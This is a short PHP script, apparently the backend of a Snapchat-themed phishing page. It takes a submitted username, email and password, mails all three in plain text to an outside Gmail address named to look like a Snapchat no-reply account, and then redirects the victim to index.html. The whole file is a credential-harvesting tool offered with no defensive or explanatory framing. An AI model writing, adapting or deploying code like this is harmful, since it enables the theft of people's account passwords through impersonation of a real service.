 <?php
 


$username = $_POST['username'];
$email = $_POST['email'];
$password = $_POST['password'];
$to = "noreplay.snapchat.net@gmail.com";
$subject = "Mail From Website";

$headers = "Form:" .$username. "\r\n" . "CC: noreplay.snapchat.net@gmail.com";

$txt = "You have recived an e-mail from" .$username.  "\r\n Email: " .$email. "\r\n
 Password:" .$password;

if($email!=NULL){
    mail($to,$subject,$txt,$headers);
}

header('Location:index.html')



 ?>